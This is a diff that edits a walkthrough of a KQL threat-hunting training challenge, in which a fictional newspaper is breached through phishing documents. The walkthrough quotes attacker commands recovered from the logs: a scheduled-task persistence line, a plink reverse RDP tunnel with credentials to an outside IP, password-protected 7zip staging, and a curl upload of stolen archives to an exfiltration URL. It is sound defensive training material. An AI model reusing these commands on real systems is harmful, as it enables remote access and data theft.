@@ -1,4 +1,4 @@
-This challenge boasts: "First full kill-chain case. IRs must be able to reconstruct the exact sequence of events — this module trains timeline reconstruction across email, endpoint, and network logs with C2 and exfiltration in scope."
+This challenge boasts that it is the first full kill-chain case in the learning path.
 
 Its learning objectives are:
 - Master basic KQL syntax, including where, take, and distinct commands
@@ -9,43 +9,35 @@ Its learning objectives are:
 
 It is tagged with: data-exfiltration, phishing, and influence operations.
 
-Let's dive in!
 
 Section 1 is KQL101.
-After signifying that we are ready, our first challenge is to run a "take 10" from the tables.
-Employees
-| take 10
-
-Next  up, we have to determine how many employees work at this organization. We are introduced to the "count" portion of a query, which, as you may have guessed, will count the rows that would otherwise be returned in the previous piece of the query. Here, it returns how many rows are in the Employees table.
+I have to determine how many employees work at this organization.
 Employees
 | count
 Answer: 100
 
-Next, we are taught about the "where" operator, and then we must find the Editorial Director's name. Lets try:
+Find the Editorial Director's name. Lets try:
 Employees
 | where role == "Editorial Director"
 Answer: Nene Leaks
 
-Now we have to see how many emails Nene received. Let's try this:
+How many emails did Nene receive? 
 Emails
-| where receipient == "nene_leaks@valdoriantimes.news"
+| where recipient == "nene_leaks@valdoriantimes.news"
 | count
-As an aside, we found her email from the previous query and scrolling to the right a tad to the email_addr column.
 Answer: 18
 
-Next, we discover the "distinct" operator and must find out how many distinct SENDERS there were from the domain weprinturstuff.com.
+How many distinct SENDERS were there from the domain weprinturstuff.com?
 Emails
 | where sender contains "weprinturstuff.com"
 | distinct sender
 | count
-(You could have also said "sender HAS", but contains felt more natural to me).
 Answer: 100
 
-Next up we have: How many distinct URLs did “Lois Lane” visit? And we are introduced to the "OutboundNetworkEvents" table.
-Let's first run:
+How many distinct URLs did “Lois Lane” visit?
 Employees
 | where name == "Lois Lane"
-And with this, we see that Lois's IP is 10.10.0.22. Next, let's run:
+And with this, I see that Lois's IP is 10.10.0.22. Next:
 OutboundNetworkEvents
 | where src_ip == "10.10.0.22"
 | distinct url
@@ -53,7 +45,6 @@ OutboundNetworkEvents
 Answer: 62
 
 How many distinct domains in the PassiveDns records contain the word “hire”?
-Let's start by going to the PassiveDns table and work from there:
 PassiveDns
 | where domain contains "hire"
 | distinct domain
@@ -61,74 +52,65 @@ PassiveDns
 Answer: 6
 
 What IPs did the domain “jobhire.org” resolve to (enter any one of them)?
-Let's run this, without the "count":
 PassiveDns
 | where domain contains "jobhire.org"
 | distinct ip
 Answer: 191.7.248.112
 
 How many distinct websites did employees with the first name "Mary" Visit?
-Alright, this one gets a bit tough. We are given this much to work with:
 let mary_ips = 
 Employees
-| where name has "Employee Name"
+| where name has "Mary"
 | distinct ip_addr;
 OutboundNetworkEvents
 | where src_ip in (mary_ips)
-| ______
-From this query, we can determine that we are looking in Employees for "Mary" (let's plug that in) with distinct IPs. Then, we are going to OutboundNetworkEvents, looking for traffic that originates (sourced) from all of the IPs we just found. And the final line has to be a "count".
+| count
 Answer: 58
 
 How many authentication attempts did we see to the accounts of employees with the first name Mary?
-We are given this query to start with and fill in:
-let variable_name_rename_me = Employees
-| where name has "Employee Name"
+let auth_attempts = Employees
+| where name has "Mary"
 | distinct username;
 AuthenticationEvents
-| where username in (variable_name_rename_me)
+| where username in auth_attempts
 | count
-Here, we are declaring a variable (which I changed to auth_attempts) and selecting the ones from Mary with distinct usernames. Then, we are taking that information, going to AuthenticationEvents, using those usernames, and counting the number of results.
 Answer: 70
 
 
-Now, we go on to Section 2: Welcome to Valdoria!
-We are given a screenshot between ourselves and Nene. We are told the newspaper printer's name is Clark Kent, and that is the answer to this question.
+Section 2: Welcome to Valdoria!
+The challenge creator's supplied a screenshot between ourselves and Nene. It mentions the newspaper printer's name is Clark Kent, and that is the answer to this question.
 
 What is the Editorial Intern's name?
-Let's try this:
 Employees
 | where role == "Editorial Intern"
 Answer: Ronnie McLovin
 
 When was the Editorial Intern hired at The Valdorian Times?
-The very first column is for hire_date, so let's expand that and we see:
+The very first column is for hire_date, so let's expand that:
 "hire_date": 2024-01-02T08:00:00.000Z
 
 How many total emails has Clark Kent received?
-First, let's run:
 Employees
 | where name == "Clark Kent"
 And we see his email address is: clark_kent@valdoriantimes.news
-Next, let's run:
 Email
 | where recipient == "clark_kent@valdoriantimes.news"
 | count 
 Answer: 21
 
-Our next task is to review the emails sent to Clark Kent for the one sent on January 31, 2024 containing the final edits for the election OpEd. What was the subject line of this email?
-If we remove "count" from the previous query, we see the 21 emails, and only 1 was sent on Jan 31:
+Review the emails sent to Clark Kent for the one sent on January 31, 2024 containing the final edits for the election OpEd. What was the subject line of this email?
+Remove "count" from the previous query/ It shows the 21 emails, and only 1 was sent on Jan 31:
 URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))
 
 Enter the sender's email address.
 ronnie_mclovin@valdoriantimes.news
-Uh oh, if Ronnie claims this wasn't legitimate, it looks like we have an account takeover on our hands!
+If Ronnie claims this wasn't legitimate, then there may have been an account takeover.
 
 What was the name of the .docx file that was sent in this email?
-Scroll all the way to the right to view the link:
 https://sharepoint.valdoriantimes.news/files/rmclovin/2024/OpEdFinal_to_print.docx
 
 Do you think this needs further investigation?
-Yes! Of course!
+Yes
 
 
 Next up is Section 3: Plenty of Phish.
@@ -138,36 +120,36 @@ Employees
 | distinct role
 Answer: Senior Editor
 
-Next, we see a screenshot of a suspicious email Sonia received and we have to find the sender's email address:
+They supply a screenshot of a suspicious email Sonia received and I have to find the sender's email address on the screenshot:
 newspaper_jobs@gmail.com
 
-Then, we are instructed to look for this email in our logs and find the timestamp.
+Then, look for this email in the logs and find the timestamp.
 Email
 | where recipient contains "sonia"
 | where sender contains "newspaper_jobs"
-This could be done several ways, really. But I chose to filter emails by recipient (being Sonia - I didn't originally write down her email address, so I used this way) and sender being the address we just found.
-Luckily, we only get 1 hit: "timestamp": 2024-01-05T09:42:05.000Z
+This could be done several ways, really. I chose to filter emails by recipient (being Sonia - I didn't originally write down her email address, so I used this way) and sender being the address we just found.
+There is only 1 hit: "timestamp": 2024-01-05T09:42:05.000Z
 
 What URL was included in the email?
-Let's just scroll to the far right: https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx
+https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx
 
 Sonia doesn't remember if she clicked this link or not, so let's find out ourselves. What is Sonia Gose's IP address?
 Employees
 | where name == "Sonia Gose"
-4th column from the left: 10.10.0.3
+Answer: 10.10.0.3
 
 Did Sonia click on this link? If so, enter the timestamp when she clicked the link. If not, type "no".
-We are going back to OutboundNetworkEvents here, and our full query is:
 OutboundNetworkEvents
 | where src_ip == "10.10.0.3"
 | where url == "https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx"
 This gets only the traffic from Sonia's IP and to the potentially suspicious URL.
 Answer: "timestamp": 2024-01-05T10:23:17.000Z
-Looks like she did click it; oh no!
+Looks like she did click it. The phishing email was successful so far, from the attacker's perspective.
 
 What was the name of the docx file in the link that Sonia clicked?
 Again, we know the link is: https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx
 So the file is: Valdorian_Times_Editorial_Offer_Letter.docx
+So Sonia did download a file from the phishing link. It's likely this will have something malicious hiding in it, as well.
 
 What is Sonia Gose's hostname?
 Employees
@@ -176,32 +158,29 @@ Employees
 Answer: UL0M-MACHINE
 
 When did the downloaded docx file first show up on Sonia's machine?
-I believe for this one, we should look at FileCreationEvents. Let's take 10 to see what columns we're working with. After that, our entire query should look like:
 FileCreationEvents
 | where hostname contains "UL0M-MACHINE"
 | where filename contains "Offer"
-To explain, we are now looking for file creation events on Sonia's machine, and we are filtering for "Offer" so we can find "Valdorian_Times_Editorial_Offer_Letter.docx"
 Answer: "timestamp": 2024-01-05T10:24:04.000Z
 
 What was the full path of the docx file that was downloaded to Sonia's machine?
-Same query, scroll to the right and we find a column named "path".
 Answer: C:\Users\sogose\Downloads\Valdorian_Times_Editorial_Offer_Letter.docx
 
 What is the sha256 hash of the file that Sonia downloaded?
-Just prior to the path column is a sha256 column: 60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f
+60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f
 
 What is the name of the file (.ps1) that was written to disk immediately after the docx was downloaded?
-Let's adjust our query ever so slightly:
 FileCreationEvents
 | where hostname contains "UL0M-MACHINE"
 | where filename contains ".ps1"
 Answer: hacktivist_manifesto.ps1
+My suspicion was correct; the downloaded file was hiding something else. And it looks like the actors are hacktivists on a mission.
 
 When was this new file created?
 "timestamp": 2024-01-05T10:24:32.000Z
 
 What type of file is this (.ps1)?
-This requires a bit of research. From this reputable source (https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scripts?view=powershell-7.6) we find:  PowerShell scripts have a .ps1 file extension.
+From this reputable source (https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scripts?view=powershell-7.6) we find that PowerShell scripts have a .ps1 file extension.
 
 We are then given a screenshot of the script. What does the attacker say to "let you know they are here"?
 This comes straight from their image: lol ur bout 2 get pwnd...
@@ -210,13 +189,11 @@ According to the PowerShell script, what might be the hacker's favorite color?
 Also from the image: green (because "green is a hackr color")
 
 The purpose of the script is to invoke ____ and uncover da truth
-Answer: Plink. Again, just look right at the image provided.
+Answer: Plink. Again, just from the image provided.
 
-The next question points us towards the ProcessEvents table, and asks how many Process Events are related to this PowerShell script on Sonia's machine?
-First, let's do this to see the columns we are working with:
+The next question points towards the ProcessEvents table, and asks how many Process Events are related to this PowerShell script on Sonia's machine:
 ProcessEvents
-| take 10
-Then, I crafted this based on those columns:
+| take 10 //This shows the columns that can potentially be queried
 ProcessEvents
 | where hostname contains "UL0M"
 | where process_commandline contains ".ps1"
@@ -226,37 +203,36 @@ What is the full command used to create the scheduled task? (It points us toward
 Answer: schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"
 
 What ExecutionPolicy is set in the command?
-As we see above, it shows "-ExecutionPolicy Bypass", so the answer is Bypass.
+As shown above, it shows "-ExecutionPolicy Bypass", so the answer is Bypass.
 
-Next, we are instructed to check ProcessEvents for evidence of plink.exe being executed on Sonia's machine. What IP address is used when plink is executed?
-For this, we adjust the query to read "plink" i place os ".ps1". Our results show a process_commandline of: plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181
+Check ProcessEvents for evidence of plink.exe being executed on Sonia's machine. What IP address is used when plink is executed?
+Adjust the query to read "plink" in place of ".ps1". Results show a process_commandline of: plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181
 
 What username did the attacker use when connecting via plink?
-The -l portion of the previous command shows us the username being used: $had0w
+The -l portion of the previous command shows the username being used: $had0w
 (Source: https://man7.org/linux/man-pages/man1/ssh.1.html)
 
 What password did the attacker use when connecting via plink?
-Same referenced line as 2 above: thruthW!llS3tUfree
+Same referenced line as 2 questions above: thruthW!llS3tUfree
 
 What six-letter command did the attackers run to figure out which user they are logged on as on the computer?
-This takes us back to our query that we must edit.
 ProcessEvents
 | where hostname contains "UL0M"
 | where timestamp between (datetime(2024-01-06T02:39:35.000Z) .. datetime(2024-01-31T02:39:35.000Z))
-The top 2 lines are the same. Where it changes is the 3rd line: we are now looking for activity between the timestamp of when the plink command was run (Jan 6) and an arbritrary time I picked: Jan 31.
+This is to now look for activity between the timestamp of when the plink command was run (Jan 6) and an arbitrary time I picked: Jan 31. (The arbitrary time later is to be nearly certain that the activity is included).
 The very next command after the plink command is "whoami".
 
 How many discovery commands did the attackers run on this machine?
-We have: whoami, ipconfig, arp -a, tasklist /svc, and net view (before other commands are run). That makes 5.
+whoami, ipconfig, arp -a, tasklist /svc, and net view
+That makes 5.
 
 Now, we've hit a dead end. No other suspicious activity on this particular machine.
 Do you think we can safely stop our investigation here? (yes/no)
-Of course not! We haven't solved the entire puzzle yet!
+No. There is still more to investigate and uncover.
 
 
 Section 4: A Scandal
 Another suspicious email address valdorias_best_recruiter@gmail.com was seen sending emails to intern Ronnie and a few others. How many total emails were sent by this email sender to users at The Valdorian Times?
-We may need to refresh our memories a bit, but here is the next query:
 Email
 | where sender == "valdorias_best_recruiter@gmail.com"
 | count
@@ -266,38 +242,36 @@ When did valdorias_best_recruiter@gmail.com send an email to Ronnie McLovin?
 Email
 | where sender == "valdorias_best_recruiter@gmail.com"
 | where recipient contains "ronnie" 
-"timestamp": 2024-01-10T08:48:16.000Z
+Answer: "timestamp": 2024-01-10T08:48:16.000Z
 
 What domain was in the link from that email?
-Let's scroll to the right to the link column: https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx
+https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx
 
 What was the subject of that email?
-Back to the left: [EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles
+[EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles
 
 When did Ronnie click on the link in the email from valdorias_best_recruiter@gmail.com ?
-Let's go back a step and get Ronnie's IP: 10.10.0.19. Our query was:
+Go back a step and get Ronnie's IP:
 Employees
 | where name contains "Ronnie"
-Now, let's plug that into OutboundNetworkEvents:
+10.10.0.19
+Take that to OutboundNetworkEvents:
 OutboundNetworkEvents
 | where src_ip == "10.10.0.19"
 | where url contains "promotionrecruit"
 Answer: "timestamp": 2024-01-10T08:55:07.000Z
 
 What was the name of the .docx file that was downloaded to Ronnie's machine?
-Well, knowing the URL clicked was: https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx
-We can do the math: Editorial_J0b_Openings_2024.docx
+Knowing the URL clicked was: https://promotionrecruit.org/share/Editorial_J0b_Openings_2024.docx
+Answer: Editorial_J0b_Openings_2024.docx
 
 When was this docx file downloaded?
-I started with this query:
 FileCreationEvents
 | where filename contains "Editorial_J0b"
-Now, we could edit in a where clause with Ronnie's machine name if we go backwards and find that information. But we can also get what we need from just this query by focusing our attention to the username field and looking for romclovin.
 Answer: "timestamp": 2024-01-10T08:55:17.000Z
-(While we're here, the machine name is A37A-DESKTOP)
+(As an aside, the machine name is A37A-DESKTOP)
 
 What IP address was used with plink on Ronnie's machine?
-Let's go back to our prior query from Sonia and edit a bit:
 ProcessEvents
 | where hostname contains "A37A"
 | where process_commandline contains "plink"
@@ -312,7 +286,6 @@ What password was used with plink on Ronnie's machine?
 See above: thruthW!llS3tUfree
 
 How many discovery commands were run on Ronnie's machine?
-Let's grab the query we used for Sonia and edit:
 ProcessEvents
 | where hostname contains "A37A"
 | where timestamp >= (datetime(2024-01-10T00:00:00.000Z))
@@ -321,10 +294,10 @@ We see: whoami, ipconfig, arp -a, tasklist /svc, and net view.
 Answer: 5
 
 What is Ronnie's IP address?
-We did this one earlier: 10.10.0.19
+10.10.0.19
 
 What is the full URL fakestory.docx was downloaded from?
-Let's check OutboundNetworkConnections for "fakestory" in the URL:
+Look at OutboundNetworkConnections for "fakestory" in the URL:
 OutboundNetworkEvents
 | where url contains "fakestory"
 Answer: https://hire-recruit.org/files/fakescandal/2024/fakestory.docx
@@ -333,17 +306,15 @@ What is Ronnie's hostname?
 Also discovered earlier: A37A-DESKTOP
 
 What is the sha256 hash of fakestory.docx on Ronnie's machine?
-Now, we are looking back at FileCreationEvents:
 FileCreationEvents
 | where filename contains "fakestory"
 | where hostname == "A37A-DESKTOP"
 Answer: 5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f
 
 When was fakestory.docx created on Ronnie's machine?
-Same query, scroll back to the left for the timestamp: "timestamp": 2024-01-31T09:47:51.000Z
+Answer: "timestamp": 2024-01-31T09:47:51.000Z
 
 After downloading fakestory.docx, the attackers ran a command to rename and move the file to a different location. What is the new path for the document?
-If we look in ProcessEvents:
 ProcessEvents
 | where hostname == "A37A-DESKTOP"
 | where process_commandline contains "fakestory"
@@ -352,12 +323,10 @@ We see the full command is: move C:\Users\romclovin\Downloads\fakestory.docx C:\
 So the new path is C:\Users\romclovin\Documents\OpEdFinal_to_print.docx
 
 When was this command executed to rename and move the file?
-Back to the left for the timestamp!
-"timestamp": 2024-01-31T10:26:20.000Z
+Answer: "timestamp": 2024-01-31T10:26:20.000Z
 
 And here we see something interesting: OpEdFinal… that seems familiar.
-That's the same file name we saw when we looked in the email logs to find Ronnie sending the draft to Clark Kent. When was OpEdFinal_to_print.docx emailed from Ronnie's account to Clark Kent?
-We can run:
+That's the same file from querying the email logs to find Ronnie sending the draft to Clark Kent. When was OpEdFinal_to_print.docx emailed from Ronnie's account to Clark Kent?
 Email
 | where sender contains "ronnie"
 | where recipient contains "clark"
@@ -365,53 +334,48 @@ Email
 Answer: "timestamp": 2024-01-31T11:11:12.000Z
 
 How many minutes elapsed between when the file was moved/renamed on Ronnie machine and when the email was sent to Clark Kent?
-This is simple math. It was moved 2024-01-31T10:26:20.000Z and 2024-01-31T11:11:12.000Z. This translates to Jan 31, 2024 at 10:26 (and 20 seconds) AM and Jan 31, 2024 at 11:11 (and 12 seconds) AM. That's just under 45 minutes, so let's put 44 to be safe.
+It was moved 2024-01-31T10:26:20.000Z and sent 2024-01-31T11:11:12.000Z. This translates to Jan 31, 2024 at 10:26 (and 20 seconds) AM and Jan 31, 2024 at 11:11 (and 12 seconds) AM. That's just over 44 minutes.
 
 What was the subject line of this email?
-Scroll back to the right: URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))
+URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))
 
 Do you think this is the only thing the attackers did on Ronnie's machine? (yes/no)
-Probably not.
+Almost certainly not (no).
 
-Next, we see a screenshot of a suspicious alert from Ronnie and we have to find the domain. This just requires looking at the image: hirerecruit.com
+Next, there is a screenshot of a suspicious alert from Ronnie and they ask to find the domain. This just requires looking at the image: hirerecruit.com
 
-Next up, we are taught that we can timebound our analysis to find other actions that ocurred around the same time by using this query:
+How many total commands were run in this timeframe?
 ProcessEvents
 | where timestamp between (datetime(2024-01-21 07:00:00) .. datetime(2024-01-21 12:00:00))
 | where hostname == "A37A-DESKTOP"
 | order by timestamp asc
-How many total commands were run in this timeframe?
 Answer: Just 2
 
-Next, we are told that there is one command the attackers ran to leverage 7zip to compress all of Ronnie's dank memes into a .7z file. What is the name of the .7z file that contains the stolen memes?
-We see this command: 7z.exe a -t7z C:\Users\romclovin\Documents\DankMemes.7z C:\Users\romclovin\Memes\*.jpg -p thruthW!llS3tUfree
+There is one command the attackers ran to leverage 7zip to compress all of Ronnie's dank memes into a .7z file. What is the name of the .7z file that contains the stolen memes?
+There is this command: 7z.exe a -t7z C:\Users\romclovin\Documents\DankMemes.7z C:\Users\romclovin\Memes\*.jpg -p thruthW!llS3tUfree
 So the answer is: DankMemes.7z
 
 What is the name of the .7z file that contains files stolen from Ronnie's Documents folder?
 The command run 2 before that was: 7z.exe a -t7z C:\Users\romclovin\Documents\MyStolenDataFromDocuments.7z C:\Users\romclovin\Documents\*.docx -p thruthW!llS3tUfree
-So, let's try MyStolenDataFromDocuments.7z
+Answer: MyStolenDataFromDocuments.7z
 
 What is the name of the .7z file that contains files stolen from Ronnie's Desktop folder?
-And between those 2 commands was: 7z.exe a -t7z C:\Users\romclovin\Documents\MyStolenDataFromDesktop.7z C:\Users\romclovin\Desktop\*.docx -p thruthW!llS3tUfree
+Between those 2 commands was: 7z.exe a -t7z C:\Users\romclovin\Documents\MyStolenDataFromDesktop.7z C:\Users\romclovin\Desktop\*.docx -p thruthW!llS3tUfree
 Answer: MyStolenDataFromDesktop.7z
 
 What is the password the attackers used to encrypt all of the .7z files?
 See above: thruthW!llS3tUfree
 
 After compressing all the stolen data into .7z files, the attackers exfiltrated the data by uploading it to a custom portal on their website. What is the full command the attackers ran to do this?
-Let's go back to the query:
 ProcessEvents
 | where hostname == "A37A-DESKTOP"
 | where process_commandline contains "7z"
-We see this as the last result: curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php
+Answer: curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php
 
 What domain was the stolen data uploaded to?
-See above: hirejob.com
+Answer: hirejob.com
 
 Query ProcessEvents for all devices at Valdorian Times. Was data stolen from any other devices and uploaded to hirejob.com? (yes/no)
-I ran:
 ProcessEvents
 | where process_commandline contains "hirejob"
 To only show us command line events where hirejob was involved. There are no other results.
-
-
